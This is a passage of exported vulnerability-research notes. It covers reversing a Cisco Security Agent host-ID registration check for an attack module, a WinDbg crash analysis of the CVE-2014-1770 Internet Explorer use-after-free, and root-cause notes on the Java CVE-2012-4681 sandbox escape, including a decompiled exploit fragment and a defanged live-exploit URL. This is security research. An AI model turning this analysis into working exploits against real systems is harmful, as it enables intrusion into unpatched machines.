lea     eax, [ebp+var_1354]\n.text:00484C1F                 push    eax\n.text:00484C20                 mov     ecx, [ebp+host_uid_var_1364]\n.text:00484C26                 call    check_uid_hostsub_47B7A0 ; check registration of host uid\n.text:00484C2B                 add     esp, 4\n.text:00484C2E                 test    eax, eax\n.text:00484C30                 jz      short loc_484C49 ; if it has been registered\n.text:00484C32                 push    offset aHostidIsNotReg ; \"Hostid is not registered for upload\"\n.text:00484C37                 lea     ecx, [ebp+Dest]\n.text:00484C3D                 push    ecx             ; Dest\n.text:00484C3E                 call    ds:sprintf\n.text:00484C44                 jmp     loc_485221\n```\n\nVersion 6.0.0.220\n\n* Get host uid\n\n```\n.text:00489820                 cmp     dword ptr [eax], 0\n.text:00489823                 jz      loc_48998A\n.text:00489829                 mov     ecx, [ebp+var_137C]\n.text:0048982F                 mov     ebx, [ecx]\n.text:00489831                 mov     edi, offset aHost_uid ; \"host_uid\"\n.text:00489836                 mov     esi, ebx\n.text:00489838                 mov     ecx, 9\n.text:0048983D                 xor     edx, edx\n.text:0048983F                 repe cmpsb\n.text:00489841                 jnz     short loc_48985C\n.text:00489843                 mov     eax, [ebp+host_uid_var_132C]\n.text:00489849                 mov     eax, [eax]\n.text:0048984B                 call    sub_47E760\n.text:00489850                 mov     [ebp+var_1368], eax\n.text:00489856                 mov     eax, [ebp+host_uid_var_132C]\n```\n\n* And check it\n\n```\n.text:00489C50\n.text:00489C50 loc_489C50:                             ; CODE XREF: sub_489380+7A3\u0018j\n.text:00489C50                 lea     eax, [ebp+var_1354]\n.text:00489C56                 push    eax\n.text:00489C57                 mov     ecx, [ebp+var_1368]\n.text:00489C5D                 call    sub_47F890\n.text:00489C62                 add     esp, 4\n.text:00489C65                 test    eax, eax\n.text:00489C67                 jz      short loc_489C80\n.text:00489C69                 push    offset aHostidIsNotReg ; \"Hostid is not registered for upload\"\n.text:00489C6E                 lea     ecx, [ebp+Dest]\n.text:00489C74                 push    ecx             ; Dest\n.text:00489C75                 call    ds:sprintf\n.text:00489C7B                 jmp     loc_48A272\n```\n\n\n* Solutions\n\nThe registration doesn't need authenticaiton (if ACL's hasn't been configured\nin the management console, by defalut anyone can register).\n\nOptions:\n\n(1) Easy: Provide in the module a HOSTUID option, and give instruction about\nhow to get a valid HOSTUID, basically the user should install a cisco agent,\nconfigure the management console as the victim, and get the legit HOSTUID which\nis saved automatically in the configuration file of the agent.\n(2) Hard: Reverse the registrarion process. A little tricky because all the\ncommunications go via SSL... anyway... playing with it!\n(3) Check check_uid_hostsub_47B7A0 in case there is a bypass for the check\nof the host id\n\n* Who is making the registration??\n\nAccording to my analysis the registration seems to be done by leventmgr.exe. I've get\na wireshark capture of the supposed registration, and I've the private key for the server,\nbut I haven't been able to decrypt the ssl traffic with the wireshark capabilities (I configured\nthe SSL private key... still no success).\n\nThe pcap file, and the certificate plus the private key for the server component are attached in the\nanalysis directory.\n\nNext steps: continue with the reversing of leventmgr.exe\n\nHooking SSL_read and SSL_write from SSLEAY32 is possible to look at the SSL encrypted communication...\n\n```\n02637008  50 4f 53 54 20 2f 63 73-61 6d 63 35 31 2f 61 67  POST /csamc51/ag\n02637018  65 6e 74 20 48 54 54 50-2f 31 2e 31 0d 0a 48 6f  ent HTTP/1.1..Ho\n02637028  73 74 3a 20 6a 66 65 64-6e 2d 36 65 64 32 64 62  st: jfedn-6ed2db\n02637038  36 63 61 38 3a 35 34 30-31 0d 0a 50 72 61 67 6d  6ca8:5401..Pragm\n02637048  61 3a 20 6e 6f 2d 63 61-63 68 65 0d 0a 41 63 63  a: no-cache..Acc\n02637058  65 70 74 2d 65 6e 63 6f-64 69 6e 67 3a 20 67 7a  ept-encoding: gz\n02637068  69 70 0d 0a 43 6f 6e 74-65 6e 74 2d 4c 65 6e 67  ip..Content-Leng\n02637078  74 68 3a 20 34 33 32 0d-0a 43 6f 6e 74 65 6e 74  th: 432..Content\n02637088  2d 54 79 70 65 3a 20 61-70 70 6c 69 63 61 74 69  -Type: applicati\n02637098  6f 6e 2f 78 2d 77 77 77-2d 66 6f 72 6d 2d 75 72  on/x-www-form-ur\n026370a8  6c 65 6e 63 6f 64 65 64-0d 0a 0d 0a 0d f0 ad ba  lencoded........\n0:035> db 01dbfd39 L1B0\n01dbfd39  63 70 61 79 6c 6f 61 64-3d 78 9c 95 51 cb 4e c3  cpayload=x..Q.N.\n01dbfd49  30 10 fc 15 5f 2a c1 61-25 32 42 bf 93 c2 29 29  0..._*.a%2B...))\n01dbfd59  c9 01 a9 08 a9 15 1c 10-07 27 76 db 40 9a 94 e6  .........'v.@...\n01dbfd69  51 54 c4 bf b3 5b 1e 77-64 79 66 34 ab 9d 5d cb  QT...[.wdyf4..].\n01dbfd79  17 43 e5 e1 23 4f 73 6b-e2 24 85 79 9c 1b d0 52  .C..#Osk.$.y...R\n01dbfd89  25 32 36 10 cf e7 39 58-9d a9 24 cf 52 25 32 35  %26...9X..$.R%25\n01dbfd99  4c f4 c9 b6 6d d7 c3 cb-3a f8 06 6c f0 d2 17 b6  L...m...:..l....\n01dbfda9  74 31 f3 5d 09 8f 55 e3-db 63 77 b7 9a 48 6e a6  t1.]..U..cw..Hn.\n01dbfdb9  72 aa a2 19 47 b9 0c 87-b1 2a 03 aa 7b 57 be 22  r...G....*..{W.\"\n01dbfdc9  49 bc 4f fd f2 19 69 22-e3 ac d9 d4 55 b7 9d c8  I.O...i\"....U...\n01dbfdd9  19 d9 ef b1 45 5a bb 1d-22 a9 5d eb 43 8d ac a9  ....EZ..\".].C...\n01dbfde9  a9 eb c3 1e 29 a2 4e c1-a5 5a a4 28 56 6e 73 85  ....).N..Z.(Vns.\n01dbfdf9  f4 b0 38 ba 43 25 30 30-43 4d da d3 06 a4 82 42  ..8.C%00CM.....B\n01dbfe09  70 04 9c 56 d1 e4 09 09-45 41 31 14 e9 34 01 d9  p..V....EA1..4..\n01dbfe19  2a fa 03 2a 14 fc 7b bd-db c1 35 14 ef 4e 6f 43  *..*..{...5..NoC\n01dbfe29  38 e1 96 6c 5f f7 ff 7e-ea f5 cf 25 32 42 d9 30  8..l_..~...%2B.0\n01dbfe39  40 a6 8c d5 37 c6 02 e7-89 02 21 b5 85 34 8d 24  @...7.....!..4.$\n01dbfe49  24 3a b1 2a c2 23 53 ce-da ee 77 06 a5 70 ae 58  $:.*.#S...w..p.X\n01dbfe59  bb 73 60 10 25 32 42 90-58 dd 13 16 b5 07 9a cc  .s`.%2B.X.......\n01dbfe69  c6 73 6d c4 9a 60 23 b9-42 44 8c fe 49 72 76 a8  .sm..`#.BD..Irv.\n01dbfe79  47 74 cb f5 19 7b b7 04-c1 39 bb fc 02 a6 46 85  Gt...{...9....F.\n01dbfe89  1c 26 70 61 79 6c 6f 61-64 5f 6c 65 6e 67 74 68  .&payload_length\n01dbfe99  3d 34 39 38 26 64 73 74-3d 35 26 61 70 74 79 70  =498&dst=5&aptyp\n01dbfea9  65 3d 31 36 26 61 70 76-65 72 73 69 6f 6e 3d 33  e=16&apversion=3\n01dbfeb9  26 68 6f 73 74 5f 75 69-64 3d 7b 46 42 46 36 35  &host_uid={FBF65\n01dbfec9  38 41 42 2d 43 38 46 35-2d 34 32 32 41 2d 38 43  8AB-C8F5-422A-8C\n01dbfed9  43 46 2d 36 34 45 33 41-46 45 42 33 31 35 37 7d  CF-64E3AFEB3157}\n```\n\n\nnow would be nice to find a way to clean the client state and get the full communication to\nregister a new host. Anyway, this cpayload field doesn't look very good.... seems like even\nover ssl, the payload while registration messages go encoded... more reversing needed here.\n",
      "score": 0,
      "metadata": {},
      "tags": []
    },
    {
      "id": "4b6213f9-c9ee-473e-81ef-e4202a4cb790",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "f58d6172-bfa6-45f0-988f-c5aab3e06e3a",
      "created": "2019-09-12T18:07:54.410402Z",
      "revisionDate": "2020-02-13T17:12:08.286145Z",
      "document": "\n\nThis is from crash2, gflags enabled\n\nOriginally discovered by Corelanc0d3r, see:\nhttps://www.corelan.be/index.php/2014/05/22/on-cve-2014-1770-zdi-14-140-internet-explorer-8-0day/\n\n# Note\n\nThis was kept private until an official patch was out from Microsoft\n\n```\n0:008> r\neax=00000000 ebx=00000000 ecx=7c91003d edx=00155000 esi=0cc2ef38 edi=0cc2ef38\neip=63621339 esp=037cfb88 ebp=037cfba4 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nmshtml!CSelectionManager::EnsureEditContext+0x30:\n63621339 837f1800        cmp     dword ptr [edi+18h],0 ds:0023:0cc2ef50=????????\n0:008> !heap -p -a edi\n    address 0cc2ef38 found in\n    _DPH_HEAP_ROOT @ 151000\n    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)\n                                    c6bc350:          cc2e000             2000\n    7c927553 ntdll!RtlFreeHeap+0x000000f9\n    6375bc86 mshtml!CSelectionManager::`vector deleting destructor'+0x00000022\n    6375b528 mshtml!CSelectionManager::Release+0x0000001e\n    6358c7b0 mshtml!CSelectionManager::DoPendingElementExit+0x00000211\n    6358c61b mshtml!CSelectionManager::DoPendingTasks+0x00000019\n    63621335 mshtml!CSelectionManager::EnsureEditContext+0x0000002c\n    6361c2bd mshtml!CHTMLEditor::Notify+0x0000005a\n    6361c270 mshtml!CHTMLEditorProxy::Notify+0x00000021\n    6360feb4 mshtml!CDoc::NotifySelection+0x00000059\n    63620f7f mshtml!CCaret::UpdateScreenCaret+0x000000dd\n    63784934 mshtml!CCaret::DeferredUpdateCaretScroll+0x00000032\n    6364de62 mshtml!GlobalWndOnMethodCall+0x000000fb\n    6363c3c5 mshtml!GlobalWndProc+0x00000183\n    7e418734 USER32!InternalCallWinProc+0x00000028\n    7e418816 USER32!UserCallWinProcCheckWow+0x00000150\n    7e4189cd USER32!DispatchMessageWorker+0x00000306\n```\n\n```\n0:008> u\nmshtml!CSelectionManager::EnsureEditContext+0x30:\n63621339 837f1800        cmp     dword ptr [edi+18h],0\n6362133d 0f8423a52300    je      mshtml!CSelectionManager::EnsureEditContext+0x36 (6385b866)\n63621343 5f              pop     edi\n63621344 c3              ret\n63621345 85c0            test    eax,eax\n63621347 7ddb            jge     mshtml!CSelectionManager::EnsureEditContext+0x16 (63621324)\n63621349 ebf8            jmp     mshtml!CSelectionManager::EnsureEditContext+0x3b (63621343)\n6362134b 85c0            test    eax,eax\n0:008> k\nChildEBP RetAddr\n037cfb88 6361d930 mshtml!CSelectionManager::EnsureEditContext+0x30\n037cfba4 6361c2bd mshtml!CSelectionManager::Notify+0x3a\n037cfbb8 6361c270 mshtml!CHTMLEditor::Notify+0x5a\n037cfbd4 6360feb4 mshtml!CHTMLEditorProxy::Notify+0x21\n037cfbf0 63620f7f mshtml!CDoc::NotifySelection+0x59\n037cfd14 63784934 mshtml!CCaret::UpdateScreenCaret+0xdd\n037cfd24 6364de62 mshtml!CCaret::DeferredUpdateCaretScroll+0x32\n037cfd58 6363c3c5 mshtml!GlobalWndOnMethodCall+0xfb\n037cfd78 7e418734 mshtml!GlobalWndProc+0x183\n037cfda4 7e418816 USER32!InternalCallWinProc+0x28\n037cfe0c 7e4189cd USER32!UserCallWinProcCheckWow+0x150\n037cfe6c 7e418a10 USER32!DispatchMessageWorker+0x306\n037cfe7c 02562ec9 USER32!DispatchMessageW+0xf\n037cfeec 025048bf IEFRAME!CTabWindow::_TabWindowThreadProc+0x461\n037cffa4 5de05a60 IEFRAME!LCIETab_ThreadProc+0x2c1\n037cffb4 7c80b713 iertutil!CIsoScope::RegisterThread+0xab\n037cffec 00000000 kernel32!BaseThreadStart+0x37\n```\n\n\nWithout gflags\n\n```\n0:008> r\neax=41424344 ebx=03323060 ecx=7c91003d edx=00000014 esi=00234ec8 edi=0000000c\neip=63620f82 esp=0201fc00 ebp=0201fd14 iopl=0         nv up ei ng nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010286\nmshtml!CCaret::UpdateScreenCaret+0xe0:\n63620f82 8b08            mov     ecx,dword ptr [eax]  ds:0023:41424344=????????\n0:008> u\nmshtml!CCaret::UpdateScreenCaret+0xe0:\n63620f82 8b08            mov     ecx,dword ptr [eax]\n63620f84 8d54246c        lea     edx,[esp+6Ch]\n63620f88 52              push    edx\n63620f89 50              push    eax\n63620f8a ff512c          call    dword ptr [ecx+2Ch]\n63620f8d 33ff            xor     edi,edi\n63620f8f 397c246c        cmp     dword ptr [esp+6Ch],edi\n63620f93 0f84669e2100    je      mshtml!CCaret::UpdateScreenCaret+0xf3 (6383adff)\n0:008> k\nChildEBP RetAddr\n0201fd14 63784934 mshtml!CCaret::UpdateScreenCaret+0xe0\n0201fd24 6364de62 mshtml!CCaret::DeferredUpdateCaretScroll+0x32\n0201fd58 6363c3c5 mshtml!GlobalWndOnMethodCall+0xfb\n0201fd78 7e418734 mshtml!GlobalWndProc+0x183\n0201fda4 7e418816 USER32!InternalCallWinProc+0x28\n0201fe0c 7e4189cd USER32!UserCallWinProcCheckWow+0x150\n0201fe6c 7e418a10 USER32!DispatchMessageWorker+0x306\n0201fe7c 00cb2ec9 USER32!DispatchMessageW+0xf\n0201feec 00c548bf IEFRAME!CTabWindow::_TabWindowThreadProc+0x461\n0201ffa4 5de05a60 IEFRAME!LCIETab_ThreadProc+0x2c1\n0201ffb4 7c80b713 iertutil!CIsoScope::RegisterThread+0xab\n0201ffec 00000000 kernel32!BaseThreadStart+0x37\n```\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "cc59810c-072d-42d0-b0e4-b15204ff53f3",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "45c06f42-ee61-4551-8298-0b856111798f",
      "created": "2019-09-12T18:07:55.18032Z",
      "revisionDate": "2020-02-13T17:12:08.009205Z",
      "document": "\n\n# References\n\nReferences about the attack:\n\n* http://labs.alienvault.com/labs/index.php/2012/new-java-0day-exploited-in-the-wild/\n* http://blog.fireeye.com/research/2012/08/zero-day-season-is-not-over-yet.html\n* http://www.deependresearch.org/2012/08/java-7-vulnerability-analysis.html\n* http://eromang.zataz.com/2012/08/27/oracle-java-0day-and-the-myth-of-a-targeted-attack/\n* http://scrammed.blogspot.com/2012/08/analysing-cve-2012-xxxx-latest-java-0day.html\n* http://www.us-cert.gov/cas/techalerts/TA12-240A.html\n* http://www.kahusecurity.com/2012/java-0-day-using-latest-dadongs-js-obfuscator/\n* http://thexploit.com/sec/java-facepalm-suntoolkit-getfield-vulnerability/\n* http://immunityproducts.blogspot.com.ar/2012/08/java-0day-analysis-cve-2012-4681.html\n* http://www.guardian.co.uk/technology/2012/aug/30/java-exploit-asian-hackers-says-symantec?newsfeed=true\n\nReferences about the Java API used:\n\n* http://www.docjar.com/html/api/java/beans/Statement.java.html     // See ClassFinder & findMethod\n* http://www.docjar.com/html/api/sun/awt/SunToolkit.java.html       // See getField()\n* http://docs.oracle.com/javase/7/docs/api/overview-summary.html\n* http://www.oracle.com/technetwork/java/seccodeguide-139067.html\n\n\ngetField() wasn't always public, see the following for an example:\n\nhttp://javasourcecode.org/html/open-source/jdk/jdk-6u23/sun/awt/SunToolkit.java.html\n\n# Summary\n\nThis is a vulnerability specifically targeting Java 7.  Some reports reveal the origin of the 0day\nexploit comes from a popular exploit kit named \"Gondad Exploit Kit\" (google \"ZZVnxA1X\"), some people\nalso claim the 0day originally comes from VulnDisco, which is an exploit pack used by Immunity\nCanvas.  No matter, the public noticed the attack as a malware being hosted at 59.120.154.62, which\nis a server located in Taiwan.  The decompiled source also has strings (lyrics) such as\n\"woyouyizhixiaomaolv\" and \"conglaiyebuqi\" indicating that whoever wrote it must know Mandarin Chinese\nquite well, possibly China because that's \"Pinyin\" input method, and he probably grew up there\ndue the choice of the song.  It would be reasonable to say that someone in China has been using the\nexploit, and hosts the malicious code on a compromised server in Taiwan.\n\nThe actual link to the live exploit is:\nhxxp://59.120.154.62/meeting/index.html\n\nThe exploit takes advantage of two issues: The ClassFinder and MethodFinder.findMethod().  Both\nwere newly introduced in JDK 7.  ClassFinder is a replacement for classForName back in JDK 6. It\nallows untrusted code to obtain a reference and have access to a restricted package in JDK 7, which\ncan be used to abuse sun.awt.SunToolkit (a restricted package).  With sun.awt.SunToolkit, we can\nactually invoke getField() by abusing findMethod() in Statement.invokeInternal() (but getField()\nmust be public, and that's not always the case in JDK 6) in order to access Statement.acc's private\nfield, modify AccessControlContext, and then disable Security Manager. Once Security Manager is\ndisabled, we can execute arbitrary Java code.\n\nOur exploit has been tested successfully against multiple platforms, including: IE, Firefox, Safari,\nChrome; Windows, Ubuntu, OS X, etc.  We have even received reports claiming the exploit also works\nagainst Solaris.\n\n# Timeline\n\nAug xx 2011 - Vulnerable code was introduced in JDK7\nApr xx 2012 - Oracle already aware of the vulnerabilities:  http://www.theregister.co.uk/2012/08/30/oracle_knew_about_flaws/\nJun xx 2012 - Infected server hosting malware code: http://urlquery.net/report.php?id=70896\nAug 26 2012 - First blog emerged about the Java 0day: http://blog.fireeye.com/research/2012/08/zero-day-season-is-not-over-yet.html\nAug 26 2012 - PoC extracted from the malicious site by Joshua Drake: https://twitter.com/jduck1337/status/239875285913317376\nAug 27 2012 - Metasploit exploit available: https://community.rapid7.com/community/metasploit/blog/2012/08/27/lets-start-the-week-with-a-new-java-0day\nAug 28 2012 - CVE assigned as CVE-2012-4681\nAug 30 2012 - Java 7 Update 7 available (out of band patch)\n\nExceptions happens on this line of the Exploit:\n\n```\nGetClass(\"sun.awt.SunToolkit\")\n\n    private Class GetClass(String paramString)\n        throws Throwable\n    {\n        Object arrayOfObject[] = new Object[1];\n        arrayOfObject[0] = paramString;\n        Expression localExpression = new Expression(Class.class, \"forName\", arrayOfObject); <===\n        localExpression.execute(); // (3) Fails !!! <====\n        return (Class)localExpression.getValue();\n    }\n```\n\nThrough Expression it tries to do Class.forName(\"sun.awt.SunToolkit\"). Despite the use of\nExpression, according to the Exception on Java6 root cause seems to be on Class.forName.\n\nWhen checking java 7 api you can read:\n\n```\npublic static Class classForName(String name) throws ClassNotFoundException\nDeprecated! As - of JDK version 7, replaced by ClassFinder#resolveClass(String) .\n```\n\nReturns the Class object associated with the class or interface with the given string name, using the default class loader\n\nSo maybe something was lost con ClassFinder#resolveClass....\n\n\nDigging into source code of openjdk:\n\n* On Java 7\n     ======\n\n```\njdk/src/share/classes/java/lang/Class.java\n\n    public static Class<?> forName(String className)\n                throws ClassNotFoundException {\n        return forName0(className, true, ClassLoader.getCallerClassLoader());\n    }\n\n\n    /** Called after security checks have been made. */\n    private static native Class<?> forName0(String name, boolean initialize,\n                                            ClassLoader loader)\n        throws ClassNotFoundException;\n\n\njdk/src/share/native/java/lang/Class.c\n\nJNIEXPORT jclass JNICALL\nJava_java_lang_Class_forName0(JNIEnv *env, jclass this, jstring classname,\n                              jboolean initialize, jobject loader)\n\n....\n    cls = JVM_FindClassFromClassLoader(env, clname, initialize,\n                                       loader, JNI_FALSE);\n```\n\n\n\nhotspot/src/share/vm/prims/jvm.cpp\n\n```\nJVM_ENTRY(jclass, JVM_FindClassFromClassLoader(JNIEnv* env, const char* name,\n                                               jboolean init, jobject loader,\n                                               jboolean throwError))\n  JVMWrapper3(\"JVM_FindClassFromClassLoader %s throw %s\", name,\n               throwError ? \"error\" : \"exception\");\n  // Java libraries should ensure that name is never null...\n  if (name == NULL || (int)strlen(name) > Symbol::max_length()) {\n    // It's impossible to create this class;  the name cannot fit\n    // into the constant pool.\n    if (throwError) {\n      THROW_MSG_0(vmSymbols::java_lang_NoClassDefFoundError(), name);\n    } else {\n      THROW_MSG_0(vmSymbols::java_lang_ClassNotFoundException(), name);\n    }\n  }\n  TempNewSymbol h_name = SymbolTable::new_symbol(name, CHECK_NULL);\n  Handle h_loader(THREAD, JNIHandles::resolve(loader));\n  jclass result = find_class_from_class_loader(env, h_name, init, h_loader,\n                                               Handle(), throwError, THREAD);\n\n  if (TraceClassResolution && result != NULL) {\n    trace_class_resolution(java_lang_Class::as_klassOop(JNIHandles::resolve_non_null(result)));\n  }\n  return result;\nJVM_END\n```\n\nhotspot/src/share/vm/classfile/systemDictionary.cpp\n\n```\njclass find_class_from_class_loader(JNIEnv* env, symbolHandle name, jboolean init, Handle loader, Handle protection_domain, jboolean throwError, TRAPS) {\n  // Security Note:\n  //   The Java level wrapper will perform the necessary security check allowing\n  //   us to pass the NULL as the initiating class loader.\n  klassOop klass = SystemDictionary::resolve_or_fail(name, loader, protection_domain, throwError != 0, CHECK_NULL);\n\n  KlassHandle klass_handle(THREAD, klass);\n  // Check if we should initialize the class\n  if (init && klass_handle->oop_is_instance()) {\n    klass_handle->initialize(CHECK_NULL);\n  }\n  return (jclass) JNIHandles::make_local(env, klass_handle->java_mirror());\n}\n\nhotspot/src/share/vm/classfile/systemDictionary.cpp\n\nklassOop SystemDictionary::resolve_or_fail(symbolHandle class_name, Handle class_loader, Handle protection_domain, bool throw_error, TRAPS) {\n  klassOop klass = resolve_or_null(class_name, class_loader, protection_domain, THREAD);\n  if (HAS_PENDING_EXCEPTION || klass == NULL) {\n    KlassHandle k_h(THREAD, klass);\n    // can return a null klass\n    klass = handle_resolution_exception(class_name, class_loader, protection_domain, throw_error, k_h, THREAD);\n  }\n  return klass;\n}\n\nklassOop SystemDictionary::resolve_or_null(symbolHandle class_name, Handle class_loader, Handle protection_domain, TRAPS) {\n  assert(!THREAD->is_Compiler_thread(), \"Can not load classes with the Compiler thread\");\n  if (FieldType::is_array(class_name())) {\n    return resolve_array_class_or_null(class_name, class_loader, protection_domain, CHECK_NULL);\n  } else {\n    return resolve_instance_class_or_null(class_name, class_loader, protection_domain, CHECK_NULL);\n  }\n}\n```\n\n.... First review of resolve_instance_class_or_null doesn't spot anything interesting at first view! Maybe\nI should check carefully\n\n* On java6:\n     =====\n\n```\njdk/src/share/native/java/lang/Class.c\n\n    public static Class<?> forName(String className)\n                throws ClassNotFoundException {\n        return forName0(className, true, ClassLoader.getCallerClassLoader());\n    }\n\n\n    /** Called after security checks have been made. */\n    private static native Class forName0(String name, boolean initialize,\n                                            ClassLoader loader)\n        throws ClassNotFoundException;\n```\n\nhotspot/src/share/vm/prims/jvm.cpp\n\n```\nJVM_ENTRY(jclass, JVM_FindClassFromClassLoader(JNIEnv* env, const char* name,\n                                               jboolean init, jobject loader,\n                                               jboolean throwError))\n  JVMWrapper3(\"JVM_FindClassFromClassLoader %s throw %s\", name,\n               throwError ? \"error\" : \"exception\");\n  // Java libraries should ensure that name is never null...\n  if (name == NULL || (int)strlen(name) > symbolOopDesc::max_length()) {\n    // It's impossible to create this class;  the name cannot fit\n    // into the constant pool.\n    if (throwError) {\n      THROW_MSG_0(vmSymbols::java_lang_NoClassDefFoundError(), name);\n    } else {\n      THROW_MSG_0(vmSymbols::java_lang_ClassNotFoundException(), name);\n    }\n  }\n  symbolHandle h_name = oopFactory::new_symbol_handle(name, CHECK_NULL);\n  Handle h_loader(THREAD, JNIHandles::resolve(loader));\n  jclass result = find_class_from_class_loader(env, h_name, init, h_loader,\n                                               Handle(), throwError, THREAD);\n\n  if (TraceClassResolution && result != NULL) {\n    trace_class_resolution(java_lang_Class::as_klassOop(JNIHandles::resolve_non_null(result)));\n  }\n  return result;\nJVM_END\n```\n\n```\njclass find_class_from_class_loader(JNIEnv* env, Symbol* name, jboolean init, Handle loader, Handle protection_domain, jboolean throwError, TRAPS) {\n  // Security Note:\n  //   The Java level wrapper will perform the necessary security check allowing\n  //   us to pass the NULL as the initiating class loader.\n  klassOop klass = SystemDictionary::resolve_or_fail(name, loader, protection_domain, throwError != 0, CHECK_NULL);\n\n  KlassHandle klass_handle(THREAD, klass);\n  // Check if we should initialize the class\n  if (init && klass_handle->oop_is_instance()) {\n    klass_handle->initialize(CHECK_NULL);\n  }\n  return (jclass) JNIHandles::make_local(env, klass_handle->java_mirror());\n}\n```\n\n\nhotspot/src/share/vm/classfile/systemDictionary.cpp\n\n```\nklassOop SystemDictionary::resolve_or_fail(Symbol* class_name, Handle class_loader, Handle protection_domain, bool throw_error, TRAPS) {\n  klassOop klass = resolve_or_null(class_name, class_loader, protection_domain, THREAD);\n  if (HAS_PENDING_EXCEPTION || klass == NULL) {\n    KlassHandle k_h(THREAD, klass);\n    // can return a null klass\n    klass = handle_resolution_exception(class_name, class_loader, protection_domain, throw_error, k_h, THREAD);\n  }\n  return klass;\n```\n\n```\nklassOop SystemDictionary::resolve_or_null(Symbol* class_name, Handle class_loader, Handle protection_domain, TRAPS) {\n  assert(!THREAD->is_Compiler_thread(), \"Can not load classes with the Compiler thread\");\n  if (FieldType::is_array(class_name)) {\n    return resolve_array_class_or_null(class_name, class_loader, protection_domain, CHECK_NULL);\n  } else if (FieldType::is_obj(class_name)) {\n    ResourceMark rm(THREAD);\n    // Ignore wrapping L and ;.\n    TempNewSymbol name = SymbolTable::new_symbol(class_name->as_C_string() + 1,\n                                   class_name->utf8_length() - 2, CHECK_NULL);\n    return resolve_instance_class_or_null(name, class_loader, protection_domain, CHECK_NULL);\n  } else {\n    return resolve_instance_class_or_null(class_name, class_loader, protection_domain, CHECK_NULL);\n  }\n}\n```\n\n.... First review of resolve_instance_class_or_null doesn't spot anything interesting at first view! Maybe\nI should check carefully\n\n\n# So going high level....\n\nAs have been said before, on JDK 7, classForName has been replaced by ClassFinder#resolveClass\n\n```\npublic static Class classForName(String name) throws ClassNotFoundException\nDeprecated! As - of JDK version 7, replaced by ClassFinder#resolveClass(String) .\n\nClassFinder doesn't exist on JDK 6, so digging into JDK 7:\n\n     * @see #resolveClass(String,ClassLoader)\n     */\n    public static Class<?> resolveClass(String name) throws ClassNotFoundException {\n        return resolveClass(name, null);\n    }\n\ncalls with loader == null....\n\n    /**\n     * Returns the {@code Class} object associated with\n     * the class or interface with the given string name,\n     * using the given class loader.\n     * <p>\n     * The {@code name} can denote an array class\n     * (see {@link Class#getName} for details).\n     * <p>\n     * If the parameter {@code loader} is null,\n     * the class is loaded through the default class loader.\n     * <p>\n     * This method can be used to obtain\n     * any of the {@code Class} objects\n     * representing {@code void} or primitive Java types:\n     * {@code char}, {@code byte}, {@code short},\n     * {@code int}, {@code long}, {@code float},\n     * {@code double} and {@code boolean}.\n     *\n     * @param name    fully qualified name of the desired class\n     * @param loader  class loader from which the class must be loaded\n     * @return class object representing the desired class\n     *\n     * @throws ClassNotFoundException  if the class cannot be located\n     *                                 by the specified class loader\n     *\n     * @see #findClass(String,ClassLoader)\n     * @see PrimitiveTypeMap#getType(String)\n     */\n    public static Class<?> resolveClass(String name, ClassLoader loader) throws ClassNotFoundException {\n        Class<?> type = PrimitiveTypeMap.getType(name);\n        return (type == null)\n                ? findClass(name, loader)\n                : type;\n    }\n\n\n    /**\n     * Returns the {@code Class} object associated with\n     * the class or interface with the given string name,\n     * using the given class loader.\n     * <p>\n     * The {@code name} can denote an array class\n     * (see {@link Class#getName} for details).\n     * <p>\n     * If the parameter {@code loader} is null,\n     * the class is loaded through the default class loader.\n     *\n     * @param name    fully qualified name of the desired class\n     * @param loader  class loader from which the class must be loaded\n     * @return class object representing the desired class\n     *\n     * @throws ClassNotFoundException  if the class cannot be located\n     *                                 by the specified class loader\n     *\n     * @see #findClass(String,ClassLoader)\n     * @see Class#forName(String,boolean,ClassLoader)\n     */\n    public static Class<?> findClass(String name, ClassLoader loader) throws ClassNotFoundException {\n        if (loader != null) {\n            try {\n                return Class.forName(name, false, loader);\n            } catch (ClassNotFoundException exception) {\n                // use default class loader instead\n            } catch (SecurityException exception) {\n                // use default class loader instead\n            }\n        }\n        return findClass(name);\n    }\n```\n\nWill call.... so here we go.... I suppose the difference could be how\nJava 7 calls to Class.forName maybe....:\n\n```\n    /**\n     * Returns the {@code Class} object associated\n     * with the class or interface with the given string name,\n     * using the default class loader.\n     * <p>\n     * The {@code name} can denote an array class\n     * (see {@link Class#getName} for details).\n     *\n     * @param name  fully qualified name of the desired class\n     * @return class object representing the desired class\n     *\n     * @throws ClassNotFoundException  if the class cannot be located\n     *                                 by the specified class loader\n     *\n     * @see Class#forName(String)\n     * @see Class#forName(String,boolean,ClassLoader)\n     * @see ClassLoader#getSystemClassLoader()\n     * @see Thread#getContextClassLoader()\n     */\n    public static Class<?> findClass(String name) throws ClassNotFoundException {\n        try {\n            ClassLoader loader = Thread.currentThread().getContextClassLoader();\n            if (loader == null) {\n                // can be null in IE (see 6204697)\n                loader = ClassLoader.getSystemClassLoader();\n            }\n            if (loader != null) {\n                return Class.forName(name, false, loader);\n            }\n\n        } catch (ClassNotFoundException exception) {\n            // use current class loader instead\n        } catch (SecurityException exception) {\n            // use current class loader instead\n        }\n        return Class.forName(name);\n    }\n```\n\nIn Java6\n\n```\n\tat java.security.AccessControlContext.checkPermission(Unknown Source)\n\tat java.security.AccessController.checkPermission(Unknown Source)\n\tat java.lang.SecurityManager.checkPermission(Unknown Source)\n\tat java.lang.SecurityManager.checkPackageAccess(Unknown Source)\n\tat sun.plugin2.applet.Applet2SecurityManager.checkPackageAccess(Unknown Source)\n\tat sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source)\n\tat java.lang.ClassLoader.loadClass(Unknown Source)\n\tat sun.plugin2.applet.Plugin2ClassLoader.loadClass0(Unknown Source)\n\tat sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)\n\tat sun.plugin2.applet.Plugin2ClassLoader.loadClass0(Unknown Source)\n\tat sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)\n\tat sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)\n\tat java.lang.ClassLoader.loadClass(Unknown Source)\n\tat java.lang.Class.forName0(Native Method)\n\tat 